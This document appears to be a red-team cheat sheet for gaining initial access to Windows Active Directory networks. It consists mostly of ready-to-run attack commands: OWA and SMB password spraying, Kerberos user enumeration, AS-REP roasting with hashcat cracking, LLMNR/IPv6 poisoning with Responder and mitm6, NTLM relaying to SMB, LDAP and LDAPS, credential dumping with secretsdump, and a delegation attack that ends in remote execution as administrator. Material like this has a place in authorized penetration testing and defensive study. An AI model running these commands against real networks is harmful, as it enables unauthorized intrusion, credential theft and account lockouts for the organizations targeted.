# Initial Access attacks
* [From the outside](#From-the-outside)
  * [Web Attacks](#Web-Attacks)  
  * [Password Attacks](#Password-Attacks)
* [From the inside](#From-the-inside)
  * [Web Attacks](#Web-Attacks2) 
  * [Password Attacks](#Password-Attacks2)
    * [Enumerate users](#Enumerate-users)
    * [AS-REP Roasting](#AS-REP-Roasting)
  * [Relaying Attacks](#Relaying-Attacks)
      * [SMB relaying](#SMB-relaying)
      * [LDAP Relaying](#LDAP-Relaying)
      * [LDAPS Relaying](#LDAPS-Relaying)
        * [Resource Based Constrained Delegation Webclient Attack](#Resource-Based-Constrained-Delegation-Webclient-Attack)

# From the outside
## Web Attacks
- It is possible to get access by abusing a lot of web attacks which might give you access to the system. There are to many to subscribe here, but I might make a list someday.

## Password Attacks
### Spray against OWA
- https://github.com/dafthack/MailSniper

#### Get NETBIOS name
```
Invoke-DomainHarvestOWA -ExchHostname <IP>
```

#### Generate list of usernames
- https://gist.github.com/superkojiman/11076951
- Needs list of possible names and lastnames from recon. Example: John Doe
```
/opt/namemash.py names.txt >> possible-usernames.txt
```

#### Timing attack - Get valid usernames
```
Invoke-UsernameHarvestOWA -ExchHostname <IP> -Domain <DOMAIN> -UserList .\possible-usernames.txt -OutFile domain_users.txt
```

#### Passwors spray
- OPSEC: In the real world, be aware that these authentication attempts may count towards the domain lockout policy for the users. Too many attempts in a short space of time is not only loud, but may also lock accounts out.
```
Invoke-PasswordSprayOWA -ExchHostname <IP> -UserList .\domain_users.txt -Password Summer2021
```

#### Download global adress list
- Get more emails, and maybe spray again!
```
Get-GlobalAddressList -ExchHostname <IP> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -OutFile gal.txt
```

# From the inside
## Web Attacks2
- It is possible to get access by abusing a lot of web attacks which might give you access to the system. There are to many to subscribe here, but I might make a list someday.

## Password Attacks2
### Enumerate users
- https://github.com/ropnop/kerbrute
```
sudo ./kerbrute userenum -d <domain> domain_users.txt -dc <IP>
```

#### Spray one password against all users
- Use ```--continue-on-success``` too keep going after 1 successful login
```
crackmapexec smb <DC IP> -d <DOMAIN> -u domain_users.txt -p <PASSWORD LIST> | tee passwordspray.txt
```

### AS-REP Roasting
```
python3 GetNPUsers.py <DOMAIN>/ -usersfile domain_users.txt -format hashcat -outputfile AS_REP_hashcat.txt
```

#### Crack hashes with hashcat
```
hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

## Relaying attacks
- https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/

#### Check if LLMNR and NBT-NS is used
- Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS).
- Use ```-A``` for analyze mode.
```
Responder -I eth0 -A
```

### SMB relaying
#### Check for SMB hosts without SMB signing
```
crackmapexec smb <IP RANGE> --gen-relay-list smb_hosts_nosigning.txt
```

#### Poison Requests
```
Responder -I eth0
```

#### Relay requests SMB and dump SAM
- we have to modify the Responder.conf file and disable the HTTP and SMB servers (as NTLM relay will be our SMB and HTTP server).
- the ```-d``` flag has now been changed from “Enable answers for NETBIOS domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False” to “Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False”. It should also be noted that ```-d``` as it is now CAN have an impact on your client’s network, as you are effectively poisoning the WPAD file over DHCP, which does not always revert back immediately once you stop the attack. It will likely require a reboot.
```
Responder -I eth0
ntlmrelayx.py -tf smb_hosts_nosigning.txt 
```

#### Relay requests SMB and keep SMB sessions open
- Use the ```socks``` option to be able to use the ```socks``` command to get a nice overview of the relayed attempts. It will also keep the SMB connection open indefinitely. 

```
Responder -I eth0
ntlmrelayx.py -tf smb_hosts_nosigning.txt --socks

# Get overview of all relay attempts
ntlmrelayx> socks

# Change socks proxy
sudo vim /etc/proxychains4.conf
socks4 127.0.0.1 1080

# Use proxychains and it will ignore the password value and use the relay credential instead
proxychains python3 secretsdump.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>

# Also possible to access shares on the network, for example if user is not local admin
proxychains python3 smbclient.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
```

### LDAP Relaying
- With mitm6
- In modern Windows operating systems, IPv6 is enabled by default. This means that systems periodically poll for an IPv6 lease, as IPv6 is a newer protocol than IPv4, and Microsoft decided it was a good idea to give IPv6 precedence over IPv4.
- However, in the vast majority of organizations, IPv6 is left unused, which means that an adversary could hijack the DHCP requests for IPv6 addresses and force authentication attempts to the attacker-controlled system. We do that by setting our system as the primary DNS server.
- Spoof any requests for internal resources

```
sudo mitm6 -d <DOMAIN> --ignore-nofqdn
ntlmrelayx.py -t ldap://<DC IP> -wh <DOMAIN> -6
```

### LDAPS Relaying
- Relaying LDAPS can add a new computer account by abusing the fact that, by default, user are allowed to join domain up to 10 new computer objects

#### Enable the LDAPS relay
- Can wait for mitm6 to poison or force it
```
sudo mitm6 -d <DOMAIN> --ignore-nofqdn

ntlmrelayx.py -t ldaps://<DC IP> --add-computer <COMPUTER NAME>
```

- When computer account is created. This account can be used to enumerate the domain!

### Resource Based Constrained Delegation Webclient Attack
- Requirements:
  - On a Domain Controller to have the LDAP server signing not enforced (default value) (Requires authentication to check)
  - On a Domain Controller to have the LDAPS channel binding not required (default value)
  - Able to add new machines accounts (default value this quota is 10) (Requires authentication to check)
  - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity) (Requires authentication to check)
  - A DNS record pointing to the attacker’s machine (By default authenticated users can do this) (Requires authentication to add)

#### Check LDAPS Binding
- https://github.com/zyn3rgy/LdapRelayScan
```
python3 LdapRelayScan.py -method LDAPS -dc-ip <IP>
```

#### Start mitm6 and NTLMRelay
```
sudo mitm6 -d <DOMAIN> --ignore-nofqdn
sudo ntlmrelayx.py -t ldaps://<DC IP> --delegate-access 
```

- When computer account is created. This account can be used to enumerate the domain!

#### Check for a user to impersonate
- Preferably a user that would be admin on the machine (Check BloodHound). Maybe another command to check if user is admin on a machine? Is that possible? We should check!
- User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
```
$creds = Get-Credential
Get-DomainUser -Credential $creds -Domain <DOMAIN> -Server <DC IP> | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
```

#### Impersonate any user and exploit
- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
```
getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
Export KRB5CCNAME=administrator.ccache
python3 Psexec.py -k -no-pass <TARGET FQDN>
python3 Secretsdump.py -k <TARGET FQDN>
```
